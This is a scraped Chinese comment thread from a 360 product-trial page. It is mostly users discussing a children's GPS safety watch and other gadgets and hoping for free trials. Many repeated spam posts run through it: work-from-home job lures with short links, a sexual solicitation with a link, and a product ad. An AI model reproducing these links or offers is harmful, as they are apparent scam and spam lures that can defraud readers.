360的值得信任，支持奇酷！
360,一直致力于打造新、奇、特产品，支持！
不顶说不过去
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右。（宝妈、学生、上班族都可以） 有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html
东西应该是发展的趋势，智控。但是在材质，价格，功能和后续功能升级等方面应该有足够的空间。只有比其他类似产品更有竞争力才是一款合格的商品。
为了孩子的安全，我也要一个！ 
安全第一   价格第二
提个问题：说温度可调，那么脚的接触温度是多少，等辐射到上肢时温度是多少，那辐射面积呢？是不是受环境影响很大，要确保上肢能速干脚会不会过热无法忍受呢?最后，头发是不是还需要用毛巾才能擦干？
都顶啊，很好啊，很实用
安全第一 价格第二 
价格太贵了！
我喜欢，我想要
越来越近了
我如果没有免费试用的资格多多钱也买！
很实在！！顶！！利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右。（宝妈、学生、上班族都可以）http://qqyx.yf9188.com/
免费试用是什么意思？免费给你了？
其实我抢了一个，今天都到货了
为安全多加一道保护罩！！
我都四期没中啦啊啊啊啊啊啊，我明明很认真的。。。
好慢啊!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 
看明白了，我要加倍试用，保护小宝宝
顶！我很喜欢！希望能中吧！我支持奇酷！越来越好！
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报 名咨询 ～每夭5o~15o，我详细作讲解～
祝奇酷生意火爆！越做越红！
祝奇酷生意火爆！越做越红！
超喜欢这手表，功能太好了
有没有试用可以申请啊？
这款手表还是蛮好的，可是上面有个监听功能，我个人不太喜欢，孩子也需要个人隐私呀！！！
英雄所见略同
什么时候能发售呢，希望别太贵。。。。。
对于我这种记性不好，忘情又大的人来说，这简直是个神物~~
这属于无聊者用的玩意儿吧。。。。。。。
从钱包里掉出来的话，你指定再别想找到钱包了
粘粘好运气 ,祝心想事成 
很coll哎！！很方便！
看看你们的工厂，这么差的环境，比我们的差多了！
衣服会成一个坨子吗？
你要保护孩子隐私平时可以不用这个功能啊。我觉得要是真的发生孩子走失或者被拐，监听功能还是有用的，能有图像就更好了。
盗版xbox360
说的好明了哇，图文并茂，希望可以获得一个宝贝来保护宝贝~
太好了，爱奇库
申请的人这么多，产品这么少，怎么可能申请上，特怀疑
能不能中只当看广告的
老婆一定会喜欢，期待中。 
是啊，条件艰苦啊
Good Luck
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览 器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
WP的怎么用啊
看清楚了，只能检测，跟普通的智能中继器一样，要净化还得买别的产品
空气净化器现在都自带检测功能了，这产品可有可无
我觉得是地域歧视，我在山西用4G网整点刷新竟然无货，MD，4G网速也抢不上。
我也喜欢，只是太昂贵了。
感觉很梦幻嘢！洗衣球在脏衣服堆里滚滚衣服就能洗干净？真想实际感受一下高科技产品喔。
喜欢喜欢，非常喜欢
期待中!希望能中！
太好了，喜欢，什么时候可以见到成品
要多少钱啊
牛逼大了啊
比较关心价格多少
好期待！摔选还要三天呐，儿童节最好的礼物呢
很期待啊，很给力的样子
呵呵 看着就很好玩
这个太容易被手机替代了，前景堪忧。
看过同名的一部电影，很有意思的
这将是儿童节最尊贵，最贴心的礼物。
我靠 我想买给妈妈和老婆
这个看起来很实用的啊
申请要钱吗
有点贵啊 、、
最好是能够实现边骑行边充电，这样会骑得更远。
感觉小朋友会很喜欢，超赞的，希望我的申请成功，希望可以给小侄女一个惊喜
要钱吗 什么时候送来 
感温系统，有一种手机带在手上会走，不带不会走，这个不是问题，只要改进就行吧。  
售价是多少呢
应该很棒吧，争取拥有一个！！早点儿使用吧！！！！
看了这个评测功能好强大。第一次评测没看到。希望在第二次评测时。能写试用报告。期待中~~~~
我自已用ISO，能得到第二次试用。我用我老婆的三星试试。等待中。。。。写试用报告
不知道咋样呢。很新鲜
这也有存在威胁，一些人拿它去送礼物，然后在别人身上盗取到什么信息可以实施犯罪
这个我很需要。如果能再做小一点就更好，一个手机拖2－3个防丢器更佳。
不错，希望有机会试用
是不是在优化，估计这个星期五应该能拍吧
玩航模 可以用下
‘’‘’‘’‘
希望有机会试用
很好的创意，劲量的小巧一下，尽量可以放在脖子上。如果可以让我做测试员！
希望有机会试用，感觉是一种不错的产品。。
这个是抽取150人送的好吧。。。
免费申请。。。从中抽150个人
神奇啊、、、、、、、、、、、、、 
真好，梦，从动手开始！
很实用，期待！
我也喜欢！真不错，从哪里买？？多少钱？
非常好~~~终于出现了   坐等试用！
应该很实用。加油。360
加油吧，快快到我碗里来！
感觉小朋友会很喜欢，超赞的，希望我的申请成功
希望真的很准，方便找孩子回家吃饭  ——、、、
产品很棒，加油
永远支持360.
楼主很霸气，看手机套是应该女同志吧，讲米健的插法时太给力太形象了。。。
喜欢360，我们全家都用360，很棒
靠，还妈妈，你过家家呢
就是电脑计算堆积，跟数控切屑正好相反，一个去料，一个堆料，不过这个堆出来的光洁度太差了。但一些形状数控机床都不好搞定。这个可能堆金属材料啊
最下面不是介绍有价格吗，一千多也有
有点高科技的东西价格就这么贵，又不挡风不挡雨，还不能带东西。试用过，代步还不错
额，自己买一个200的自行车都嫌贵！！！
对于我们穷屌丝的百十块钱的车来说有道理！！！
我们一家人不仅杀毒；下载用360，看影片；购物总之什么都用的360，确实好用，而且安全。支持360.
比自行车还贵，为了 招贼吗？
喜欢360，我们全家都用360，很棒
每天发帖会不会更有希望啊，从来没有像今天这么勤快发帖。真心期待，花钱都没处买贴心的产品。
喜欢360，手机电脑上用的都是360的软件，每天来关注一下，看看能申请到不，为了孩子的安全。
很喜欢用360，旗下的品牌也都有在用，灰常方便实用的
我觉得应该给我个，360的产品我一直在用，每年光彩票都花不少钱，虽然没中，抽奖也老是谢谢合作，但一直在坚持，这次能不能给个安慰奖！！！！
我自己开了一家电脑店，我基本一天都外面跑业务，经常就老婆一个人看店，忙的时候很难照顾到女儿,真心需要一个这样的产品
支持360，加油
这个肯定便宜不了
支持360
跟银行用的那个有啥区别
我也有同感
一直在用360的产品 
有了360这款产品,可以解放多少父母亲啊!
作用其实和汽车GPS理论一样！建议产品扩大内存，地图更新最新版，GPS芯片提高到汽车GPS导航级！误差在10米内才有用，500米太大了，即使出现事情，查找起来也费时费力，而且误差的时间也不一定找的到
歧视山西10m光纤什么都没看到
女儿越来越大了，自理能力也增强了，老是想自己做些事情。可是她自己出去大人又不放心。有时还偷偷跟着，可是被她发现又怕打击她的自信心。要是有了这款手表，大人在家就能掌握孩子的动态，太方便安全了，一直用的360的产品。希望360还能开发更多的这样的产品。
想买，我喜欢
一直使用360这产品，感觉很好的，
太重，造型不好看，行驶距离短，最多适合汽车临时代步下，没市场前景。
还没出来就基本上要淘汰了
我只想知道在哪里能够买得到，免费试用就不抱希望了
希望360也能给老人也开发个类似的产品，家里有个姥姥年龄很大了，还是自己住，身体又不好。接她来吧她又死倔，就是不能跟外孙媳妇。我们又担心她自己，平时还要上班，抽点空就去看她。路途远，精疲力尽。原来给她买的老年手机，她不会用，老是往一边一扔，担心他真有什么事怎么办。希望360可以研发一款轻巧，便于携带的产品。让我们随时可以了解老人的情况。也就当吃个定心丸了。
我期待东西不错 
贴心服务，释放担心，360儿童卫士2，期待拥有
我也喜欢这两，哪里能买呢？
有想要的吗？联系我的QQ，我有个全新的，自己用不到，191677555
如果能再开点399的就好了，希望开发团队能倾听广大网民的声音！
真的好期待拥有呀！这样就不用在上班的时候担心孩子在哪了？
一直在用360的产品 
贵了，现在很多学校都推出校园通，功能和这个产品一样，只是以挂牌的形势出现，目前移动的售价才300+RMB
真心期待能被选上！！
价格几何，啥时可购？
真贵。伤不起
作为360的老用户，真心的希望像360一样有着业内良知的企业越办越好~！！
我也没抢到啊！
请问在哪里可以买到啊？
非常期待这样一款产品，太好了！就像你的太太一样禁止为你点燃香烟。还能够监控电子烟和尼古丁口香糖！
太幸运了！！
看起来很方便，点个赞
价格有点贵
我家的小调皮，，正好用上，但愿能选上，推荐给更多的朋友
有希望价格不要太高，亲民点!控制一台遥控直升机,好期待！轻便、时尚、优雅和更人性化！
两个孩子在一起上学，男孩就比较皮一点，有时放学了大人刚好没空去接他们就要自己回家，如果是女孩子就比较乖点放心店，但是再加上个男孩要走上一个小时的路程才能到家真的很让人不放心，所以我非常期待能拥有这款产品，这样能知道孩子在哪里在做什么就可以放点心了
这东西，三五十还行，人类靠这个记一天吸烟量，那不是扯淡。
建议腕表外形做得好看点，可爱点，现在小孩的审美要求可高了，尤其女孩。否则孩子不喜欢戴，我们也没办法啊
好创意，好生活
期待......
360的创意送给广大父母的安心，看着很给力，期待中。。。
贴心服务，释放担心，360儿童卫士2，真心期待能被选上！！ 
请问那里可以买到啊
如果真的可行，网游类小说里说的游戏头盔就有可能实现了
希望能设置小孩姓名，需要时按键显示或固定显示，避免小孩拿错别人的同款手表
很期待！不知道价格怎么样？
后来看到价格  确实有些小贵……
这是胶枪的功能？
俺孩子很喜欢手表，经常拿爸爸妈妈的手表戴在胳膊上，这款一定是孩子的最爱！期待！
作为360的老用户，真心的希望像360一样有着业内良知的企业越办越好~！！ 
源于生活用于生活，360人们的安全卫士
超喜欢   希望能有一个  如果对方就是一个普通的手机还能做投影式通话吗？价格不要太贵啊
360儿童卫士2 越来越贴心的设计，希望能够获得试用的机会。
这个好，学校多媒体，就要很多。我之前定的都不清。
由于做生意，小孩一般和爷爷奶奶生活在一起，爷爷奶奶数岁也都大了，一般很多事情是小孩自己完成的，平时我们不在小孩身边，担心是肯定的。如手环佩戴给小孩，让我们爸爸妈妈能及时通过手环撑握孩子所处位置，了解小孩身边所发生的事情等。这样好的产品对我们常做生意无暇照顾小孩的家长真是一件神器。如手环功能真的像介绍那们神奇，那就大大为我们担心小孩的安全加了一把安全琐。好产品，支持一个。此产品从哪里可以买到呢？
希望能选上。
安卓版的电视游戏？xbox，ps完爆
现在丢孩子的太多了 不敢让孩子去户外充分的活动 又不能让孩子在闭塞的环境下长大 不利于孩子的身心健康 这款产品真的能解决这个两难的问题 真心希望能够试用 体会这个产品
希望这次能给女儿   带来这个手表
小宝宝5岁了，需要这样的定位手表。能让家人安心许多！
真心希望能被选上，觉得功能真不错！
不错，可以边煅炼边看电视，也可以边听音乐，很好的东西。但定价不要太高了才行。
这款产品可以减轻做父母的忧虑 
能让手表不随意摘下来的话更好。首先丢， 第二被人摘下来。
特别特别想要试用。。。赞一个。。。。可是就怕媳妇不给孩子用，给我用怎么办。。。。。虽然我在外边没什么事，但是被媳妇强迫用这个玩意，很别扭的样子。
goodluck!真心想试用。
360人们期待中，奇酷我们看好你
孩子是每个父母的心肝宝贝 愿天下每个宝宝健康快乐的茁壮成长..
祝我好运!
由于我们做生意，小孩一般和爷爷奶奶生活在一起，爷爷奶奶数岁也都大了，一般很多事情是小孩自己完成的，平时我们不在小孩身边，担心是肯定的。如手环佩戴给小孩，让我们爸爸妈妈能及时通过手环撑握孩子所处位置，了解小孩身边所发生的事情等。这样好的产品对我们常做生意无暇照顾小孩的家长真是一件神器。如手环功能真的像介绍那们神奇，那就大大为我们的担心小孩的安全加了一把安全琐。请问哪里可以买到此神器。
希望能被选中哦，很实用
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
这东西早有了，不算什么新奇，就看看你们能不能做的更好了。
哇，还有这么好的产品，这样家长就省心多了，希望都能得到试用资格
现有产品缺点，室内基站定位偏差太大，室外定位延迟时差大，精确定位待机时间太短，佩戴体积太大，做工粗糙，希望360有所改进，不指望选上，只希望快点出货，好给孩子买一个。 
这样我就更放心了不用担心孩子走丢了。
想为八十多岁的父母购置。
很强大的手表！希望能通过申请。
孩子单独上下学非常想试用一个。
 忽悠姐99 还以为是多科技的东西呢，不就是热熔枪吗，五金店有的是   同感。。。。。。。。。。
如果可以再平民价一点，用来种一些宝宝爱吃的蔬果也很不错，也不怕宝宝去“破坏”植物的生长，放在房间里也不弄脏地面，也可以美化环境，挺有意思的。
好东西，对于没有装校园网的用户来说是不错，但是价格偏高，希望360能够参考国内用户的实际购买能力，均衡定价
真心想试用，然后像亲朋好友进行推广。
期待中签朋友的精彩报告。
希望2代加入呼叫器功能 这样家长可以对手表发提示信息 手表端可以闪烁图标或者声音，达到提示小孩完成预约好的事情。例如家长已到学校门口接小孩放学只要呼叫一下，就可以提示小孩出来。免得小孩提前在校门口等待，增加危险性。
很有意思啊。不过想问下会不会钻来钻去被衣物缠住发挥不了原理上的清洁效果呢？
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右 。（宝妈、学生、上班族都可以）有意者【http://t.cn/8sfyr3p】复制到浏览器打开 ～即可报名咨询 ～会有客服作详细讲解～ ～～ ～
使用与儿童，老人也看用啊！
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右 。（宝妈、学生、上班族都可以）有意者【http://t.cn/8sfyr3p】复制到浏览器打开 ～即可报名咨询 ～会有客服作详细讲解～ ～～ ～ 
希望能被抽中，祝福我吧，也给儿子一次使用的机会，能正正体会到这款手表的多用途。
一款小孩，老人，老公都适合使用的产品。
貌似很赞的样子，如果以后的手表再能加上实时影像，那就完美了！呵呵
科技是一步一步更新的，我相信360有这个能力，带我们一同智能，给我安全，帮我们守护宝宝，成为当之不愧的守护天使
是一款很贴心的产品，希望好运能降临～～
希望好运降临，从未使用过此类产品，希望能被选上，我们为孩子能做的还有更多。
希望这种东西能给我们起到作用
建议对老人也开发同类产品，关心父母的远远不够。
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右 。（宝妈、学生、上班族都可以）有意者【http://t.cn/8sfyr3p】复制到浏览器打开 ～即可报名咨询 ～会有客服作详细讲解～ ～～ ～  
很适用的一款产品 
此货真是急家长之所急，希望能尽快用上此贴心产品。
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右 。（宝妈、学生、上班族都可以）有意 者【http://t.cn/8sfyr3p】复制到浏览器打开 ～即可报名咨询 ～会有客服作详细讲解～ ～～ ～  
中国最好的蜜之一——东北黑蜂椴树雪蜜，适合全家日常食用：http://item.taobao.com/item.htm?spm=a1z2k.6997417.1995871729.75.VDJLZ7&amp;scm=12306.1.0.0&amp;id=38858757267
老板，我都申请N回了，请你给我一次宝贵试用的机会吧。
看重续航力，最好能 5 天以上。这对寄宿学校的孩子方便不少，家长也放心多了
真心想试用，然后向亲朋好友及家长进行推广。
真心想试用
建议对功能方面做个全面介绍
提交不了啊
呵护孩子，这个活动很有意义，希望能选中，给孩子加上更为安全的保护。
，，，，，，，，，，，，，，，，，，，，，，，，
我在360申请的试用产品中从来没有被幸运的选中,希望这次能够抽中我
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右 。（宝妈、学生、上班族都可以）有意者【http://t.cn/8sfyr3p】复制到浏览器打开 ～即可报名咨询 ～会有客服作详细讲解～ ～～ ～  
孩子如果真想躲着你，把手表随便往学校一放或让同学一戴就出去玩了，你有辙吗？
价格真心贵啊~
自已在家如何取血液做检测，如果能设计成全部用唾液检测就更适合一般家庭使用了，由于是一次性，价格方面明显偏贵了。
谢谢兄弟，也祝你下次好运！
颜色很活泼，功能也实用。这辈子也没被馅饼扎过，重在参与。
不错哦~期待中~
创意不错，如果能开发出来，并且有亲民的价格，一定会被普及的。
看中，大赞！期待呀！如果好用，呵呵，周边朋友的需求那是供不应求呀！
希望好运之神将临我身上，免去为孩子提心吊胆的生活！
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右 。（宝妈、学生、上班族都可以）有意者【http://t.cn/8sfyr3p】复制到浏览器打开 ～可报名咨询 ～会有客服作详细讲解～ ～～ ～  
这款产品非常适用于中国这种环境，儿童独自上下学无太多安全保障，家里上年纪的长辈独自出门也让人担心，如果产品及时定位效果优秀，一定会有广阔市场。
什么时间出来啊 期待中
很有创意！什么时候可以试用啊
俺是527号测试官，满心期待获得测试机会。 为俺家宝贝添加安全的护盾
上我这儿来吧
好东西，非常适合孩子用
好东西，就是太贵了
很期待尝试一下！
游戏迷超喜欢的装备了呵呵
试用申请，并迫切希望同类功能性产品及时普及
直接卖我就好
期待中~~~~
此手表只解决了小孩无意走失的问题，没有解决人为失踪的问题，还有不幸被绑架、诱拐，因为手表太容易取下来了。。。希望研发者开发更好产品，比如植入皮肤的小芯片。。。
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右 。（宝妈、学生、上班族 都可以）有意者【http://t.cn/8sfyr3p】复制到浏览器打开 ～可报名咨询 ～会有客服作详细讲解～ ～～ ～  
很棒哦，可以让包包减重了，少装很多东西。钥匙扣、充电宝、U盘！喜欢！颜色要是再有多些选择会更好！
那么多人排队呢，我也不申请了，等待结果跟上市…………
最棒的设计就是，能用它来回找手机！真正做到双向定位互动！值得期待！！！！
我想要啊，什么时候有啊
苹果的配件就是一个贵啊！不过还是支持这样的东西，希望会让生活更方便快捷！
是的，这个可以有~
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右 。（宝妈、学生、上班族 都可以）有意者 【http://t.cn/8sfyr3p】复制到浏览器打开 ～可报名咨询 ～会有客服作详细讲解～ ～～ ～  
很喜欢这款宝贝，希望神奇的宝贝能到我们家做客啦！我会好好款待你的。期待中。。。。。。
你傻呀，不会不和孩子说有那个功能
360的产品很有创意啊。安全公司。
这个我很需要啊。
我在360申请的试用产品中从来没有被幸运的选中,希望这次能够抽中我 
对于老公这样的商务男来说，这款钥匙扣可以减轻他包包的负重，实惠又便捷，还可以当装饰品，商务男值得拥有哦
很高兴被抽中，感谢！等机器~~~
我是第一次来，希望能抽到一个吧！
这个淘宝上已经有卖的了。本来想做的看有卖的就不做了，价位一直偏高，希望3可以通过这个平台使更多好产品被大家认可。
很智能的一款产品，很希望有一个
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
这个手表只是一个辅助作用，最好的还是我们的心放在孩子身上。人机合一，
希望能申请成功，另外建议下，为什么1代2代都是手环呢，可以考虑下其他儿童产品不，例如项链，皮带什么的，可穿戴设备手环类的太多了。
最好能快一点上市，试用的数量很有限啊
&quot; 罗技 3 年前也曾尝试过同样的方案，Harmony Link。Harmony Link 的想法与 MightyRC 几乎完全相同。&quot;  是别人先出的好伐，怎么变成别人的想法和你完全相同呢？ 准确的表述，应该是：  &quot; 罗技 3 年前就已经在使用这种方案，Harmony Link。 MightyRC 的想法与 Harmony Link 几乎完全相同。&quot;
申请了 不知道能中不，关注此类产品好久了
喜欢，吊炸天可以做在手机外壳套上
应该是很有市场前景，期待中
 底下痒！我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！  ，谁可以给我！好难受，我需要那个！！这里可以看到照片地址【 http://www.dwz.cn/i1TIa 】  想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！ 
原来360的防丢卫士创意来自于此。 值得期待。
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
有意思，期待中 
底下痒！我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到照片地址【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！
像你这种垃圾，就该直接抓起来枪毙，多少人辛辛苦苦攒的钱，都被你这些垃圾给坑去了。
科技改变社会，科技方便生活，科技让利于民，360安全手表把安全送到家。支持360，
革命性的开始，不过估计技术有难度吧
已经递交了哦，能中最好~支持一下。
底下痒！我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到照片地址【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！ 
就是你这种无知不思进取的思想才混到今天的地步。哪位兄弟说的不错，大胆的创新才是硬道理。
真不错，科技改变生活~
申请了 不知道能中不，关注此类产品好久了
底下痒！我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到【照片地址】【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！  
希望可以是150分之1.我会继续关注奇酷.赞
底下痒！我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到【照片地址】[心]【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！  
对于每天上下班为了锻炼身体而走路的我，实在是太合适了~我什么时候才能拥有呢~~期待啊~
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
能不能加快脚步，别光测试啊，数量太少了，我们需要这种商品，最起码心理能有个安慰，我现在眼睛都不敢离开孩子，只怪社会坏人太多呀。
真的好想要啊
好东东啊。。。。很期待。。。。
希望能够早点投入到市场销售中去,这种产品的作用太大了.
希望可以申请成功，看到此产品很高兴，我也关注这类产品很久了，不知道什么时候才能上市啊！
很期待！这么多人排队试用，希望幸运之神快快降临，非常想试用一个
360的标志可以去掉吗？坏人一看就知道不对，肯定会扔掉手表
我也希望自己能申请成功刚好是6月1日礼物
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。通过能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者 请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。通过能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。通过能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！
很有前景，但是是高端用户的需求。
底下痒！我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到【照片地址】【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！ 
非常喜欢这款产品，我家依娜调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。通过能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！ 
想要，可能这样我会愉快的减肥
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。通过能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！
上哪里去买子弹型的电池？在中国吗？
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。通过能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。通过能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！ 
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！ 
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！ 
弄个单镜头的行不行，，能当行车记录仪用！
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！ 
底下痒！我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到【照片地址】【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！  
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！ 
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！ 
底下痒！我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到【照片地址】【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！  
底下痒！我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到【照片地址】【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！  
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！ 
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！ 
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！ 
底下痒！我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到【照片地址】【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！  
哈哈 好喜欢啊 快点出来啊 迫不及待~\(≧▽≦)/~啦啦啦
底下痒！我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到【照片地址】【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！  
喜欢啊 ，这个 我老婆就是需要这样的东西 
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！ 
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！ 
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！ 
这个不错！
第一，最好做成窄一些，宽一些的。可以靠墙放，不占地方。第二，最好能够产生逆转光合作用，晚上能够在房间释放氧气。呵呵。
